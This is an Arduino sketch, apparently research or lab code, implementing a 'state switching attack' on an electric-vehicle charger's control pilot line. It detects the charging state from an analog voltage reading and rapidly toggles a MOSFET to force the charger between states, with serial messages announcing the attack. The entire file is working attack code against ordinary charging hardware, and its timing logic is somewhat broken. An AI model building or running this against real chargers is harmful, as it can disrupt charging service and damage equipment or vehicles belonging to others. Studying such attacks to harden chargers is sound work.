const int STATE_DET_PIN = A0; // Pin for state detection input
const int REALLOAD_PIN = 5; // Pin for real load mosfet control(M1)
const int SS_PIN = 3; // Pin for state switching mosfet control(M3)

//intialize state switching
void stateSwitchingInit() {
    pinMode(SS_PIN, OUTPUT);
    digitalWrite(SS_PIN, LOW); // Start with state switching mosfet off
    }


// ADC thresholds (0–1023, scaled to 0–5 V)
const int STATE_A_MIN = 900;   // ~4.4–5.0 V
const int STATE_B_MIN = 700;   // ~3.3–4.4 V
const int STATE_C_MIN = 450;   // ~2.1–3.3 V
const int STATE_E_MAX = 50;    // ~0 V

//timing constants (in milliseconds)
#define REALLOAD_TIME_MS       1000     // ~1 PWM period
#define SS_TIME_MS             3000


//globlal variables
//bool realLoad;
bool stateSwitching;
unsigned long attackTimer = 0;

void setup() {

pinMode(STATE_DET_PIN, INPUT);  
pinMode(REALLOAD_PIN, OUTPUT);
//tempInit();
stateSwitchingInit();

 Serial.begin(9600);
 Serial.println("System Initialized");

}

//StateC detector
bool isStateC() {
    int adcValue = analogRead(STATE_DET_PIN);
  Serial.print("ADC Value: ");
  Serial.println(adcValue);
    return (adcValue >= STATE_C_MIN && adcValue < STATE_B_MIN);
}

//Helper functions 

// Only real EV load connected
void realLoadOnly() {
  digitalWrite(REALLOAD_PIN, HIGH);   // M1 ON
  //digitalWrite(FAKELOAD_PIN, LOW);   // M2 OFF
  digitalWrite(SS_PIN, LOW);        // M3 OFF
}

// State switching attack
void stateSwitchingOnly() {
  digitalWrite(REALLOAD_PIN, HIGH);   // M1 ON
  //digitalWrite(FAKELOAD_PIN, LOW);    // M2 OFF
  digitalWrite(SS_PIN, HIGH);// M3 ON
}

void loop() {
    // Abort attack if charger leaves State C
  if (!isStateC()) {

     Serial.println("Not connected to charger or not in State C. Aborting attack.");
  
  digitalWrite(REALLOAD_PIN, LOW);    // M1 OFF
  digitalWrite(SS_PIN, LOW);    // M3 OFF
    
  delay(500);
    return;
  }
  
  attackTimer = millis();

   // keep EV load connected
  digitalWrite(REALLOAD_PIN, HIGH);
  

  if (millis() - attackTimer < SS_TIME_MS) {

    stateSwitching = !stateSwitching;

    if (stateSwitching) {
      Serial.println("State Switching ON");
      digitalWrite(SS_PIN, HIGH);
    } 
    else {
      Serial.println("State Switching OFF");
      digitalWrite(SS_PIN, LOW);
    }
  }
}

